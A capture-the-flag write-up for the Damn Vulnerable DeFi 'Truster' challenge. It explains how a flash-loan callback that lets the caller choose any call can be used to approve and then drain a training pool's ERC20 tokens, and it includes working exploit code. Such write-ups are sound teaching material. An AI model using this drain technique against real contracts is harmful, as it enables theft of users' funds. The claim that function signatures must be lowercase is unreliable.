---
layout: post
title:  Damn Vulnerable DeFi - Truster
categories: [DeFi, Solidity, DVDF]
excerpt: Writeup for Truster.
---
# Truster

First off, [the pwnable is here](https://www.damnvulnerabledefi.xyz/challenges/1.html). I'll be talking from the perspective of someone with some exploit dev experience (say, completion of [pwncollege](https://pwn.college/)), but with basically no Solidity nor DeFi experience.

[Solidity By Example](https://docs.soliditylang.org/en/v0.8.0/solidity-by-example.html) is pretty good for giving a basic introduction to the language and will be assumed.

## What Do We Have To accomplish?

We have to somehow make the following pass:
```js
after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(
        await this.token.balanceOf(attacker.address)
    ).to.equal(TOKENS_IN_POOL);
    expect(
        await this.token.balanceOf(this.pool.address)
    ).to.equal('0');
});
```

So, we have to move all tokens from the pool to the attacker.

## Defining The Attack Surface

We have to somehow move the tokens out of the pool; we can only interact with the pool using `flashLoan`, so it must have something to do with the aforementioned function.

```solidity
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

We clearly see that we can do a callback with `target.functionCall` on the behalf of `target`!
This is the same attack surface as a server side request forgery (SSRF)!
Our scope contains `this.token` and `this.pool`, so we can narrow our scope to something within the interface provided by `this.token`, which is ERC20.

Note also that we have, as a check after the callback,
```solidity
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
```

So, we have to use some ERC20 function which gives us the permission to move funds out of the pool _after_ we finish the `flashLoan` call.
Reading through the [ERC20 standard](https://eips.ethereum.org/EIPS/eip-20) gives us `approve` as our way of accomplishing this!


## Obtaining The Exploit

The documentation on `approve` is a little vague.
Your account? 
In the context of scope or what? 
How do we specify what token we're approving?
I found it useful to look through [this tutorial](https://ethereum.org/en/developers/tutorials/transfers-and-approval-of-erc-20-tokens-from-a-solidity-smart-contract/) to get a stronger model of what appprove does.

Namely, we follow the following syntax
```solidity
// within the scope of the _owner
token_contract.approve(spender_address, value);
```

So, we specify `target` as `this.token`, `spender_address` as `this.attacker`, and `value` as `TOKENS_IN_POOL`.

`data` as the type `bytes calldata`, which [can be found here](https://docs.soliditylang.org/en/v0.8.11/abi-spec.html#abi).
The Examples section makes it fairly self explanatory, but one annoying footgun is the `keccak256` hash of the function name; it must be all lowercase, with no spaces (this is detailed within the `Function Selector` portion of the ABI spec docs).

After we've `approve`d the tokens via the flash loan callback, we can just `transfer` everything out of the pool and into the attacker!

```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    function uint256pad(str)
    {
        return ('0').repeat(64 - str.length) + str;
    }
    const funcSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("approve(address,uint256)"));
    const data = '0x' + funcSig.slice(2, 10) + uint256pad(attacker.address.slice(2).toLowerCase()) + uint256pad(TOKENS_IN_POOL.toHexString().slice(2));

    await this.pool.connect(attacker).flashLoan(
        10, this.pool.address, this.token.address, data);
    await this.token.connect(attacker).transferFrom(
        this.pool.address, attacker.address, TOKENS_IN_POOL);
});
```
